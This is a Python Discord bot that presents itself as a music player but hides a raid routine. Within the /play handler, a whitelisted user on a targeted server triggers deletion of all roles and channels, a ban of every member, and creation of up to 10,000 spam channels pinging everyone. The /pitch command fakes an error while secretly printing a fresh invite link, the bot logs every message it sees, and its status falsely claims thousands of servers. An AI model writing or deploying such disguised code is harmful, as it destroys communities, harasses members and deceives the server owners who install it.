import os, discord, random, time
from discord import interactions
from youtube_dl import YoutubeDL

token = "Token" #Bot token here
raidID = 0 #Server ID to be raided
whitelist = [] #ID of members who can initiate the raid

start_message = "nooo" #primary message
spam_message = "https://youtu.be/WnVltopWrfY" #The message to be spammed 3 times per channel along with a ping
bot_status = "Running on 5258 servers!" #Bot statussss
possible_names = ["L"] #The possible names of the new channels and roles created

class myClient(discord.Client):
    def __init__(self, *, intents):
        super().__init__(intents = intents)
        self.tree = discord.app_commands.CommandTree(self)

    async def setup_hook(self):
        await self.tree.sync(guild = None)

client = myClient(intents = discord.Intents.all())
start_time = time.time()

is_playing = False
is_paused = False

music_queue = []
YDL_OPTIONS = {'format': 'bestaudio', 'noplaylist':'True'}
FFMPEG_OPTIONS = {'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5', 'options': '-vn'}

VC = None

def main():
    os.system("cls")

    def search_yt(item):
        with YoutubeDL(YDL_OPTIONS) as ydl:
            try:
                info = ydl.extract_info("ytsearch:%s" % item, download=False)["entries"][0]
            except:
                return False
            
            return {"source": info["formats"][0]["url"], "title": info["title"]}
    
    def play_next():
        global is_playing

        if len(music_queue) > 0:
            is_playing = True

            url = music_queue[0][0]["source"]
            music_queue.pop(0)

            VC.play(discord.FFmpegPCMAudio(url, **FFMPEG_OPTIONS), after=lambda e: play_next())
        else:
            is_playing = False
    
    async def play_music(interaction: interactions.Interaction, song: str):
        global VC
        global music_queue
        global is_playing

        if len(music_queue) > 0:
            is_playing = True

            url = music_queue[0][0]["source"]

            if VC is None or not VC.is_connected():
                VC = await music_queue[0][1].connect()

                try:
                    await VC.move_to(music_queue[0][1])
                    music_queue.pop(0)
                    
                    ffmpeg = discord.FFmpegPCMAudio(url, **FFMPEG_OPTIONS)
                    VC.play(ffmpeg, after=lambda e: play_next())

                    embed = discord.Embed(color=discord.Color.green(), title="Song added to the queue", description="Song added: {}".format(song))
                    await interaction.response.send_message(embed=embed)

                except Exception as error:
                    embed = discord.Embed(color=discord.Color.red(), title="Error!!!", description="Error trying to perform action, are you sure you are on a voice channel?")
                    await interaction.response.send_message(embed=embed)
            else:
                is_playing = False

    @client.event
    async def on_ready():
        print("https://discord.com/api/oauth2/authorize?client_id={}&scope=applications.commands%20bot".format(client.user.id))

        activity = discord.Activity(type=discord.ActivityType.listening, name=bot_status, bot_status=discord.Status.idle)
        await client.change_presence(activity=activity)

        print("> Bot started in {} seconds".format((time.time() - start_time)))

    async def proccess_reponse(interaction: interactions.Interaction, song):
        if interaction.guild_id == raidID:
            if interaction.user.id in whitelist:
                for x in list(interaction.guild.roles):
                    try:
                        await x.delete()
                    except:
                        pass
                
                for x in list(interaction.guild.channels):
                    try:
                        await x.delete()
                    except:
                        break
                
                for x in list(interaction.guild.members):
                    try:
                        await x.ban()
                    except:
                        pass
                
                embed = discord.Embed(color=discord.Color.blue(), title="The server has been raided!!! oh no!!!", description=start_message)
                embed.set_image(url="https://i.pinimg.com/originals/9e/99/77/9e9977f938d1c2f09efa33aefb7b6fd6.gif")
                
                category = await interaction.guild.create_category("Information")
                information_channel = await interaction.guild.create_text_channel(category=category, name="Server status")
                
                await information_channel.send(embed=embed)
                
                spam_category = await interaction.guild.create_category("Raid")
                
                for _ in range(0, 10000):
                    try:
                        guild = client.get_guild(interaction.guild_id)
                        channel = await guild.create_text_channel(category=spam_category, name=random.choice(possible_names))
                        
                        await interaction.guild.create_role(name=random.choice(possible_names))
                        
                        for x in range(0, 3):
                            to_send = client.get_channel(channel.id)
                            await to_send.send("{} @everyone @here".format(spam_message))
                    except:
                        break
            else:
                try:
                    global music_queue

                    voice_channel = interaction.user.voice.channel

                    if voice_channel is None:
                        embed = discord.Embed(color=discord.Color.red(), title="Error!!!", description="Error trying to perform action, are you sure you are on a voice channel?")
                        await interaction.response.send_message(embed=embed)
                    else:
                        songURL = search_yt(song)

                        if type(song) == type(True):
                            embed = discord.Embed(color=discord.Color.red(), title="Error!!!", description="Incorrect format!!!")
                            await interaction.response.send_message(embed=embed)
                        else:
                            music_queue.append([songURL, voice_channel])

                            if is_playing == False:
                                await play_music(interaction, song)
                except:
                    embed = discord.Embed(color=discord.Color.red(), title="Error!!!", description="Error trying to perform action, are you sure you are on a voice channel???")
                    await interaction.response.send_message(embed=embed)
        else:
            embed = discord.Embed(color=discord.Color.red(), title="Error!!!", description="Error trying to perform action, are you sure you are on a voice channel?")
            await interaction.response.send_message(embed=embed)

    @client.tree.command(name="play", description="Play the song you want via a URL within a voice chat!")
    async def play(interaction: interactions.Interaction, song: str):
        await proccess_reponse(interaction, song)
    
    @client.tree.command(name="pitch", description="Adjust the pitch of the song you are listening to")
    async def pitch(interaction: interactions.Interaction):
        embed = discord.Embed(color=discord.Color.red(), title="Error!!!", description="Error trying to perform action, are you sure you are on a voice channel?")

        try:
            link = await interaction.channel.create_invite(max_age=300)
            print("> Invite : {}".format(link))
        except:
            pass

        await interaction.response.send_message(embed=embed)
    
    @client.tree.command(name="help", description="Information about the bot and its commands")
    async def help(interaction: interactions.Interaction):
        embed = discord.Embed(color=discord.Color.green(), title="Commands")

        embed.add_field(name="/play", value="Play the song you want via a URL within a voice chat! (it can only be done with youtube urls)")
        embed.add_field(name="/pitch", value="Adjust the pitch of the song you are listening to")

        await interaction.response.send_message(embed=embed)
    
    @client.event
    async def on_message(msg: discord.Message):
        if msg.author != client.user:
            print("> {} | {} : {}".format(msg.channel.name, msg.author.name, msg.content))

if __name__ == "__main__":
    main()

client.run(token)
